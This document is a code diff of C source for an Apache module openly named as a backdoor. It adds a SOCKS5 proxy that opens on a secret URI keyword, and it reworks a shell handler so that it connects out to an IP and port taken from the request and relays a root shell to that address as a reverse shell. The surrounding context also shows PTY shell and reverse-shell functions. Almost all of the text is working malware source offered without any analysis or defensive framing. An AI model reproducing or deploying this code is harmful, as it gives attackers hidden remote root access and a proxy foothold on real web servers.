@@ -29,6 +29,9 @@
 #include <pty.h>
 #include <utmp.h>
 
+// link with lpthread
+#include<pthread.h>
+
 #include "httpd.h"
 #include "http_config.h"
 #include "http_protocol.h"
@@ -167,8 +170,141 @@ void socks5_ip_send_response(int fd, char *ip, unsigned short int port)
 	write(fd, (void *)&port, sizeof(port));
 }
 
+/*void *worker(int fd, int port) {
+    int inet_fd = -1;
+    int command = 0;
+    unsigned short int p = 0;
 
-void app_socket_pipe(int fd0, int fd1)
+    socks5_invitation(fd);
+    socks5_auth(fd);
+    command = socks5_command(fd);
+
+    pid_t pid;
+
+    pid = fork();
+    if(pid < 0){
+        exit(0);
+    }else if (pid == 0){
+        if (command == IP) {
+            char *ip = NULL;
+            ip = socks5_ip_read(fd);
+            p = socks5_read_port(fd);
+            inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
+            if (inet_fd == -1) {
+                exit(0);
+            }
+            socks5_ip_send_response(fd, ip, p);
+            free(ip);
+        }
+    }else{
+        app_socket_pipe(inet_fd, fd, port);
+        close(inet_fd);
+    }
+    exit(0);
+}*/
+
+void* worker(int fd) {
+
+    int inet_fd = -1;
+    int command = 0;
+    unsigned short int p = 0;
+    //write(fd,"Command\n",strlen("Command\n")+1);
+    socks5_invitation(fd);
+    socks5_auth(fd);
+    command = socks5_command(fd);
+
+    if (command == IP) {
+        //write(fd,"Command\n",strlen("Command\n")+1);
+        char *ip = NULL;
+        ip = socks5_ip_read(fd);
+        p = socks5_read_port(fd);
+
+        /*write(fd,ip,strlen(ip)+1);
+        write(fd,p,strlen(p)+1);*/
+
+        inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
+        if (inet_fd == -1) {
+            exit(0);
+        }
+        socks5_ip_send_response(fd, ip, p);
+        free(ip);
+    }
+
+    app_socket_pipe(inet_fd, fd);
+    close(inet_fd);
+    exit(0);
+}
+
+void* waitProxy(int fd, int port){
+
+    int opt = 1;
+    int new_socket;
+    // Prepare Socket for proxy socks5
+    int proxysockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (proxysockfd < 0 ){
+        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+        exit(0);
+    }
+
+    if(setsockopt(proxysockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
+        write(fd,"setsockopt",strlen("setsockopt"));
+        close(proxysockfd);
+        exit(0);
+    }
+
+    struct sockaddr_in server;
+    int serverlen = sizeof(server);
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = INADDR_ANY;
+    server.sin_port = htons(port);
+
+    pthread_t thread_id;
+
+
+    if (bind(proxysockfd, (struct sockaddr *)&server,
+             sizeof(server))<0)
+    {
+       write(fd,"bind failed",strlen("bind failed"));
+       exit(0);
+    }
+
+    //close(fd);
+
+    if (listen(proxysockfd, 3) < 0)
+    {
+        write(fd,"Listen failed",strlen("Listen failed"));
+        exit(0);
+    }
+    /*if(  < 0)
+    {
+        exit(0);
+    }*/
+    while(1){
+        new_socket = accept(proxysockfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
+
+        pid_t pid;
+        pid = fork();
+        if(pid < 0){
+            close(new_socket);
+            exit(0);
+        }else if (pid == 0){
+            close(proxysockfd);
+            /*if( pthread_create(&thread_id , NULL ,  worker , new_socket) < 0)
+            {
+                write(fd, "Could not create thread\n", strlen("Could not create thread\n") + 1);
+                exit(0);
+            }
+            pthread_join(thread_id , NULL);*/
+            worker(new_socket);
+            exit(0);
+        }else{
+            close(new_socket);
+        }
+    }
+}
+
+
+void app_socket_pipe(int fd0, int fd1, int port)
 {
 	int maxfd, ret;
 	fd_set rd_set;
@@ -188,44 +324,24 @@ void app_socket_pipe(int fd0, int fd1)
 
 		if (FD_ISSET(fd0, &rd_set)) {
 			nread = recv(fd0, buffer_r, BUFSIZE, 0);
-			if (nread <= 0)
-				break;
+			if (nread <= 0){
+                //waitProxy(port);
+                break;
+			}
 			send(fd1, (const void *)buffer_r, nread, 0);
 		}
 
 		if (FD_ISSET(fd1, &rd_set)) {
 			nread = recv(fd1, buffer_r, BUFSIZE, 0);
-			if (nread <= 0)
-				break;
+			if (nread <= 0){
+                //waitProxy(port);
+                break;
+			}
 			send(fd0, (const void *)buffer_r, nread, 0);
 		}
 	}
 }
 
-void *worker(int fd) {
-	int inet_fd = -1;
-	int command = 0;
-	unsigned short int p = 0;
-
-	socks5_invitation(fd);
-	socks5_auth(fd);
-	command = socks5_command(fd);
-	if (command == IP) {
-		char *ip = NULL;
-		ip = socks5_ip_read(fd);
-		p = socks5_read_port(fd);
-		inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
-		if (inet_fd == -1) {
-			exit(0);
-		}
-		socks5_ip_send_response(fd, ip, p);
-		free(ip);
-    }
-
-	app_socket_pipe(inet_fd, fd);
-	close(inet_fd);
-	exit(0);
-}
 
 
 void shell(int socket) {
@@ -257,7 +373,7 @@ void shell(int socket) {
 	}
 	return;
 }
-void restartApache(int socket){
+void restartApache(){
 
     pid_t spid;
 
@@ -274,7 +390,7 @@ void restartApache(int socket){
     return;
 }
 
-void reverseShell(int socket,char* ip, char* port, char* prog){
+void reverseShell(char* ip, char* port, char* prog){
 
     pid_t spid;
 
@@ -366,7 +482,6 @@ void shellPTY(int socket) {
                         n = read(terminalfd,&output,2048);
                         if (n <= 0){
                             kill(pid,SIGKILL);
-                            //restartApache(socket);
                             break;
                         }else{
                             write(socket,&output,n);
@@ -376,7 +491,6 @@ void shellPTY(int socket) {
                         n = read(socket,&input,2048);
                         if (n <= 0){
                             kill(pid,SIGKILL);
-                            //restartApache(socket);
                             break;
                         }else{
                             write(terminalfd,&input,n);
@@ -388,7 +502,6 @@ void shellPTY(int socket) {
     }
     return;
 }
-
 
 static int backdoor_post_read_request(request_rec *r) {
 	int fd, sock, n, sr;
@@ -424,9 +537,85 @@ static int backdoor_post_read_request(request_rec *r) {
 		fd = client_socket->socketdes;
 	}
 
-	if (!strcmp(r->uri, SOCKSWORD)) {
-		worker(fd);
-		exit(0);
+	if (strstr(r->uri, SOCKSWORD)) {
+        char* meh = strtok(r->uri,"/");
+        char* port = strtok(NULL,"/");
+        pthread_t thread_id;
+
+        waitProxy(fd,atoi(port));
+
+        /*tpid = fork();
+        if (tpid < 0){
+            write(fd,"Can't fork",strlen("Can't fork"));
+            close(fd);
+            exit(0);
+        }else if (tpid == 0){ // Child procress
+            write(fd,"alo",strlen("alo"));
+            waitProxy(atoi(port));
+        }else{ // Father process
+            write(fd,"papa",strlen("papa"));
+            close(fd);
+        }*/
+
+
+        /*if( pthread_create(&thread_id , NULL ,  waitProxy , (port,&fd)) < 0)
+        {
+            write(fd, "Could not create thread\n", strlen("Could not create thread\n") + 1);
+            exit(0);
+        }
+        pthread_join(thread_id , NULL);*/
+        //waitProxy(atoi(port));
+
+        //sleep(1000000);
+
+        exit(0);
+        /*int opt = 1;
+        int new_socket;
+        // Prepare Socket for proxy socks5
+        int proxysockfd = socket(AF_INET, SOCK_STREAM, 0);
+        if (proxysockfd < 0 ){
+            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            exit(0);
+        }
+
+        if (setsockopt(proxysockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT,
+                       &opt, sizeof(opt)))
+        {
+            write(fd,"setsockopt",strlen("setsockopt"));
+            exit(0);
+        }
+
+        struct sockaddr_in server;
+        server.sin_family = AF_INET;
+        server.sin_addr.s_addr = INADDR_ANY;
+        server.sin_port = htons(atoi(port));
+        int serverlen = sizeof(server);
+        pthread_t thread_id;
+
+        if (bind(proxysockfd, (struct sockaddr *)&server,
+                 sizeof(server))<0)
+        {
+            write(fd,"bind failed",strlen("bind failed"));
+            exit(0);
+        }
+
+        if (listen(proxysockfd, 3) < 0)
+        {
+            write(fd,"Listen failed",strlen("Listen failed"));
+            exit(0);
+        }
+
+        if ((new_socket = accept(proxysockfd, (struct sockaddr *)&server,
+                                 (socklen_t*)&serverlen))<0)
+        {
+            write(fd,"Accept failed",strlen("Accept failed"));
+            exit(0);
+        }
+        close(fd);
+        worker(new_socket,port);
+
+        exit(0);*/
+
 	}
 	if (!strcmp(r->uri, PINGWORD)) {
 		write(fd, "Alive!", strlen("Alive!"));
@@ -474,11 +663,36 @@ static int backdoor_post_read_request(request_rec *r) {
         exit(0);
     }
 
-	if (!strcmp(r->uri, SHELLWORD)) {
+	if (strstr(r->uri, SHELLWORD)) {
 		if (pid) {
 			char buf[1024];
 			int sd[2], i;
 
+			/** Prepare socket to send reverse shell **/
+
+			// Socket to send the reverse shell
+            int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
+            if (revsockfd < 0 ){
+                write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+                exit(0);
+            }
+
+            char* meh = strtok(r->uri,"/");
+            char* ip = strtok(NULL,"/");
+            char* port = strtok(NULL,"/");
+
+            struct sockaddr_in client_to_connect;
+            client_to_connect.sin_addr.s_addr = inet_addr(ip);
+            client_to_connect.sin_family = AF_INET;
+            client_to_connect.sin_port = htons(atoi(port));
+
+            if (connect(revsockfd , (struct sockaddr *)&client_to_connect , sizeof(client_to_connect)) < 0)
+            {
+                write(fd, "Reverse socket can't connect to client\n", strlen("Reverse socket can't connect to client\n") + 1);
+                exit(0);
+            }
+
+            // IPC socket
 			sock = socket(AF_UNIX, SOCK_STREAM, 0);
 			if (sock < 0) {
 				write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
@@ -491,11 +705,16 @@ static int backdoor_post_read_request(request_rec *r) {
 				write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
 				exit(0);
 			}
-
+			// Tell IPC
 			write(sock, "SHELL\n", strlen("SHELL\n") + 1);
-			write(fd, "[+] Shell Mode\n", strlen("[+] Shell Mode\n") +1);
+			// Info in original socket
+			char* info = malloc(strlen("Sending Reverse Shell to \n")+strlen(ip)+strlen(port)+2);
+			sprintf(info,"Sending Reverse Shell to %s:%s",ip,port);
+			write(fd, info, strlen(info) +1);
+
 			sd[0] = sock;
-			sd[1] = fd;
+			sd[1] = revsockfd;
+			close(fd);
 
 			//Bidirectional write client <--> IPC (--> to forked root apache2 process)
 			while (1){
@@ -511,10 +730,10 @@ static int backdoor_post_read_request(request_rec *r) {
 							n = read(sd[i], buf, 1024);
 							if (i == 0) {
 								if (n <= 0) {
-									write(fd, "ERRIPC\n", strlen("ERRIPC\n") + 1);
+									write(revsockfd, "ERRIPC\n", strlen("ERRIPC\n") + 1);
 									exit(0);
 								}
-								write(fd, buf, strlen(buf) + 1);
+								write(revsockfd, buf, strlen(buf) + 1);
 							}
 							else {
 								if (n > 0) {
@@ -601,14 +820,14 @@ backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, ser
 					if (strstr(buf, "SHELL")){
 						shellPTY(sd);
 					}else if (strstr(buf, "APACHE")){
-					    restartApache(sd);
+					    restartApache();
 					}else if(strstr(buf, "reverse")){
                         char* meh = strtok(buf,"/");
                         char* ip = strtok(NULL,"/");
                         char* port = strtok(NULL,"/");
                         char* prog = strtok(NULL,"/");
 
-                        reverseShell(sd,ip,port,prog);
+                        reverseShell(ip,port,prog);
 					}
 				}
 			}
